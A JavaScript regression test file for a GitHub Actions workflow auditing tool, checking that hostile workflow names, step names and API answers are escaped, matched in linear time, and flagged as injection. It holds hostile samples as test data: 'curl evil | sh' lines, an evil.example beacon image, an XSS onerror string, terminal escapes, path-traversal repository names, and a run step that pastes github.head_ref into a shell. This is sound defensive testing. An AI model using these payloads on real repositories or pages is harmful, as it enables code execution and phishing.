// Hostile input: workflow files, run and step names, and API answers an outside contributor can
// shape. Each test is a finding from the security review, kept as a regression.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cacheInputOn, isOn, jobNamePattern, wholeExpression } from '../src/workflow.mjs';

const fast = (fn, ms = 200) => {
  const t = process.hrtime.bigint();
  fn();
  const took = Number(process.hrtime.bigint() - t) / 1e6;
  assert.ok(took < ms, `took ${took.toFixed(0)} ms`);
};

test('a long unterminated ${{ in a feature switch is read in linear time', () => {
  const hostile = '${{' + ' '.repeat(50000) + 'x';
  fast(() => { isOn(hostile); cacheInputOn(hostile); });
  assert.equal(isOn(hostile), false);
  // The same answers as before for real values.
  assert.equal(wholeExpression('${{ matrix.lfs }}'), 'matrix.lfs');
  assert.equal(wholeExpression('  ${{false}}  '), 'false');
  assert.equal(wholeExpression('${{'), null);
  assert.equal(isOn('${{ false }}'), false);
  assert.equal(isOn("${{ 'false' }}"), false);
  assert.equal(isOn('${{ inputs.lfs }}'), true);
  assert.equal(cacheInputOn("${{ '' }}"), false);
  assert.equal(cacheInputOn('${{ matrix.cache }}'), true);
});

test('a long job name against a job name with expressions is matched in linear time', () => {
  const { rx } = jobNamePattern('a${{ x }}b${{ y }}c${{ z }}d${{ w }}e');
  const hostile = 'a' + 'b'.repeat(20000) + 'c'.repeat(20000) + 'd'.repeat(20000) + 'X';
  fast(() => rx.test(hostile));
  assert.equal(rx.test(hostile), false);
  assert.equal(rx.test('a1b2c3d4e'), true);
  assert.equal(rx.test('abcde'), true);
  assert.equal(rx.test('a1b2c3d4'), false); // the last literal is a suffix
  assert.equal(rx.test('xa1b2c3d4e'), false); // the first is a prefix
  // A reusable call with expressions claims "<name> / <child>" and nothing else.
  const call = jobNamePattern('deploy ${{ inputs.env }}', { reusable: true }).rx;
  assert.equal(call.test('deploy prod / build'), true);
  assert.equal(call.test('deploy prod / '), false);
  assert.equal(call.test('deploy prod'), false);
  fast(() => call.test('deploy ' + ' / '.repeat(20000)));
});

import { cell, fence, md, report } from '../src/report.mjs';
import { compare } from '../src/compare.mjs';
import { analyse } from '../src/analyse.mjs';
import { data, job, runs } from './helpers.mjs';

test('md: repository text displays as text, never as markup', () => {
  // A newline cannot start a heading or a new block.
  assert.equal(md('pwn\n\n## 0. Fix: run curl evil | sh'), 'pwn  ## 0. Fix: run curl evil | sh');
  // No image, link, HTML or comment.
  assert.equal(md('![x](https://evil.example/b.png)'), '`![x](https://evil.example/b.png`)');
  // A bare URL or email address, which GitHub would link by itself, is shown as code: never a link.
  assert.equal(md('visit https://evil.example/login now'), 'visit `https://evil.example/login` now');
  assert.equal(md('see www.evil.example.'), 'see `www.evil.example`.');
  assert.equal(md('mail ceo@evil.example'), 'mail `ceo@evil.example`');
  assert.equal(cell('CI https://evil.example|x'), 'CI `https://evil.example`\\|x');
  assert.equal(md('`fetch-depth: 0` and https://a.io'), '`fetch-depth: 0` and `https://a.io`');
  assert.equal(md('<img src=x onerror=alert(1)> <!-- hide'), '&lt;img src=x onerror=alert(1)&gt; &lt;!-- hide');
  assert.equal(md('\\[x](y)'), '\\\\\\[x\\](y)'); // a backslash cannot unescape the bracket
  // Code spans stay code (markdown shows them literally); an unpaired backtick is escaped.
  assert.equal(md('`fetch-depth: 0` fetches <all>'), '`fetch-depth: 0` fetches &lt;all&gt;');
  assert.equal(md('a `b <c>'), 'a \\`b &lt;c&gt;');
  assert.equal(md('``x`` y'), '`x` y');
  // Terminal escapes are removed.
  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), '`ok]8;;https://evilclick]8;;[8mhidden`'); // no ESC or BEL left; the word with a URL is code, not a link
  // A table cell cannot add a column, from a code span or after a backslash either.
  assert.equal(cell('a|b'), 'a\\|b');
  assert.equal(cell('`x\\|y`'), '\\`x\\\\\\|y\\`');
  assert.equal(cell('a\\|b'), 'a\\\\\\|b');
});

test('a long word with no address in it is rendered in linear time', () => {
  const word = 'a'.repeat(200000);
  fast(() => md(word));
  fast(() => cell(word));
  fast(() => md(`${'a.'.repeat(100000)}@`));
  fast(() => md('.'.repeat(200000) + 'https:'));
  const a = analyse('o/r', data({ workflows: [{ name: word, runs: runs(10), jobsPerRun: [[job()]] }] }));
  fast(() => report(a), 1000);
  assert.equal(md('@octocat says hi'), '`@octocat` says hi'); // a mention would notify; shown as code
});

test('fence: many separate backtick runs do not overflow, and the fence outgrows the longest', () => {
  const body = 'a`'.repeat(300000) + '`````';
  let lines;
  assert.doesNotThrow(() => { lines = fence(body); });
  assert.equal(lines[0], '```````yaml'); // the last run is six backticks long
});

test('a report renders when a hostile step name puts many backtick runs into its example', () => {
  const name = 'a`'.repeat(200000);
  const file = `on: [pull_request]\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - name: ${JSON.stringify(name)}\n        run: echo "\${{ github.head_ref }}"\n`;
  const a = analyse('o/r', data({ workflows: [{ name: 'CI', runs: runs(10), jobsPerRun: [[job()]] }] }));
  a.findings.unshift(...scanFindings(new Map([['.github/workflows/ci.yml', file]])));
  let out;
  assert.doesNotThrow(() => { out = report(a); });
  assert.match(out, /untrusted input in a script/);
});

test('fence: an example cannot close its own fence', () => {
  const [open, body, close] = fence('run: |\n  ```\n  # injected\n');
  assert.equal(open, '````yaml');
  assert.equal(close, '````');
  assert.match(body, /```/);
});

test('report and compare: a hostile step name and workflow name stay text', () => {
  const steps = [['Set up job', 1], ['![x](https://evil.example/beacon.png) <img src=x onerror=alert(1)>\x1b]0;pwned\x07', 120], ['Complete job', 0]];
  const a = analyse('o/r', data({ workflows: [{ name: 'CI\n\n## Fix: curl evil | sh', runs: runs(20), jobsPerRun: [[job({ steps })]] }] }));
  const out = report(a);
  // No live image or HTML: `![x](` may appear only inside a code span, which displays it literally.
  assert.doesNotMatch(out, /<img|(^|[^`])!\[x\]\(|\x1b|\x07/m);
  assert.doesNotMatch(out, /\n## Fix: curl/);
  const c = compare(a, a);
  assert.doesNotMatch(c, /\n## Fix: curl|\x1b/);
});

import { apiBase, createClient } from '../src/github.mjs';
import { REPO_RE } from '../src/index.mjs';
import { run } from '../src/action-run.mjs';
import { collect } from '../src/collect.mjs';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fakeFetch, t } from './helpers.mjs';

test('the token goes to the API the runner names, and only over https', () => {
  assert.equal(apiBase({}), 'https://api.github.com');
  assert.equal(apiBase({ GITHUB_API_URL: 'https://ghes.example.com/api/v3/' }), 'https://ghes.example.com/api/v3');
  assert.equal(apiBase({ GITHUB_API_URL: 'https://api.acme.ghe.com' }), 'https://api.acme.ghe.com');
  assert.throws(() => apiBase({ GITHUB_API_URL: 'http://ghes.example.com/api/v3' }), /plain https URL/);
  assert.throws(() => apiBase({ GITHUB_API_URL: 'https://user:pw@ghes.example.com' }), /plain https URL/);
  assert.throws(() => apiBase({ GITHUB_API_URL: 'not a url' }), /not a URL/);
  assert.throws(() => createClient({ baseUrl: 'http://api.github.com' }), /https/);
});

test('the action audits through GITHUB_API_URL on GitHub Enterprise Server', async () => {
  const hosts = new Set();
  const fetchImpl = async (url) => {
    hosts.add(new URL(url).host);
    return fakeFetch({ 'api/v3/repos/o/r/actions/runs?': { workflow_runs: [] } })(url.replace('https://ghes.example.com/', 'https://api.github.com/'));
  };
  const dir = mkdtempSync(join(tmpdir(), 'ciw-'));
  const out = [];
  await run({ env: { INPUT_REPOSITORY: 'o/r', GITHUB_TOKEN: 'x', GITHUB_API_URL: 'https://ghes.example.com/api/v3', RUNNER_TEMP: dir }, stdout: { write: (s) => out.push(s) }, fetchImpl });
  assert.deepEqual([...hosts], ['ghes.example.com']);
});

test('a repository name cannot walk the API path, and a file name cannot change the request', async () => {
  for (const bad of ['../x', 'o/..', 'o/.', './r', '..%2f/x']) assert.equal(REPO_RE.test(bad), false, bad);
  for (const ok of ['o/r', 'my.org/repo.js', 'o/.github', 'a-b/c_d']) assert.equal(REPO_RE.test(ok), true, ok);
  const asked = [];
  const routes = {
    'repos/o/r/actions/runs?': { workflow_runs: runs(3).map((r) => ({ ...r, path: '.github/workflows/ci?ref=evil#x.yml' })) },
    'repos/o/r/actions/runs/': { jobs: [job()] },
    'repos/o/r/contents': [],
  };
  await collect(createClient({ fetchImpl: fakeFetch(routes, { calls: asked }) }), 'o/r', { now: new Date(Date.parse(t(7 * 86400))) });
  assert.ok(asked.some((u) => u.endsWith('contents/.github/workflows/ci%3Fref%3Devil%23x.yml')), asked.join('\n'));
  assert.ok(!asked.some((u) => /contents\/[^%]*\?ref=evil/.test(u)));
});

test('an answer too large, or one that never finishes, is an error, not a hang', async () => {
  const bigError = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response(JSON.stringify({ message: 'x'.repeat(200000) }), { status: 400 }) });
  await assert.rejects(bigError.get('repos/o/r'), (err) => /GitHub API 400/.test(err.message) && err.message.length < 400);
  const big = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('x'.repeat(4096), { status: 200, headers: { 'x-ratelimit-remaining': '4000' } }) });
  await assert.rejects(big.getRaw('repos/o/r/contents/a.yml'), /answer too large/);
  const declared = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('{}', { status: 200, headers: { 'content-length': '999999999' } }) });
  await assert.rejects(declared.get('repos/o/r'), /answer too large/);
  const stalled = createClient({ timeoutMs: 50, backoffMs: [], fetchImpl: (url, { signal }) => new Promise((_, reject) => signal.addEventListener('abort', () => reject(signal.reason))) });
  // The deadline's timer does not hold the process open (a real request's socket does), so the
  // test keeps it alive while it waits.
  const keepAlive = setTimeout(() => {}, 5000);
  const t0 = Date.now();
  await assert.rejects(stalled.get('repos/o/r'), /network/);
  assert.ok(Date.now() - t0 < 2000);
  clearTimeout(keepAlive);
});

import { scanFindings, scanWorkflow, untrustedExpressions } from '../src/scans.mjs';

test('the injection scan reads the fields the review found missing', () => {
  const hits = (s) => untrustedExpressions(s).map((x) => x.field);
  for (const f of [
    'github.event.workflow_run.display_title',
    'github.event.head_commit.committer.name',
    'github.event.commits[0].committer.email',
    'github.event.pull_request.head.repo.description',
    'github.event.workflow_run.head_repository.description',
    'github.event.workflow_run.pull_requests[0].head.ref',
  ]) assert.equal(hits(`echo "\${{ ${f} }}"`).length, 1, f);
  assert.deepEqual(hits('echo ${{ github.event.workflow_run.id }} ${{ github.event.head_commit.committer.date }}'), []);
});

test('untrusted text that reaches a script through env is found; a variable read as "$VAR" is not', () => {
  const wf = (steps, top = '', job = '') => `on: [pull_request]\npermissions: {}\n${top}jobs:\n  b:\n    runs-on: ubuntu-latest\n${job}    steps:\n${steps}`;
  // Set in env, pasted back with ${{ env.X }}: the same injection.
  const step = scanWorkflow(wf('      - env:\n          TITLE: ${{ github.event.issue.title }}\n        run: echo "${{ env.TITLE }}"\n'));
  assert.deepEqual(step.injections.map((x) => x.field), ['env.title']);
  // From the workflow or the job env, and through a chain of variables.
  assert.equal(scanWorkflow(wf('      - run: echo ${{ env.T }}\n', 'env:\n  T: ${{ github.head_ref }}\n')).injections.length, 1);
  assert.equal(scanWorkflow(wf('      - env:\n          B: ${{ env.A }}\n        run: echo ${{ env.B }}\n', '', '    env:\n      A: ${{ github.event.comment.body }}\n')).injections.length, 1);
  // Read as a shell variable: the fix itself, not a finding.
  assert.equal(scanWorkflow(wf('      - env:\n          TITLE: ${{ github.event.issue.title }}\n        run: echo "$TITLE"\n')).injections.length, 0);
  // Set again from trusted text in a nearer scope: no longer untrusted there.
  assert.equal(scanWorkflow(wf('      - env:\n          T: fixed\n        run: echo ${{ env.T }}\n', 'env:\n  T: ${{ github.head_ref }}\n')).injections.length, 0);
});

test('the report says what the scans do not check', () => {
  const a = analyse('o/r', data({ workflows: [{ name: 'CI', runs: runs(10), jobsPerRun: [[job()]] }] }));
  a.scanned = { read: 1, of: 1, unreadable: [] };
  assert.match(report(a), /They do not check pull_request_target or workflow_run jobs that run a fork's code or artifacts, composite actions/);
});

import { html } from '../src/html.mjs';

test('the HTML report loads nothing from anywhere', () => {
  const page = html([analyse('o/r', data({ workflows: [{ name: 'CI', runs: runs(10), jobsPerRun: [[job()]] }] }))]);
  assert.doesNotMatch(page, /<link[^>]+href=|<script[^>]+src=|https?:\/\/fonts\.|@import|url\(\s*['"]?https?:/i);
});
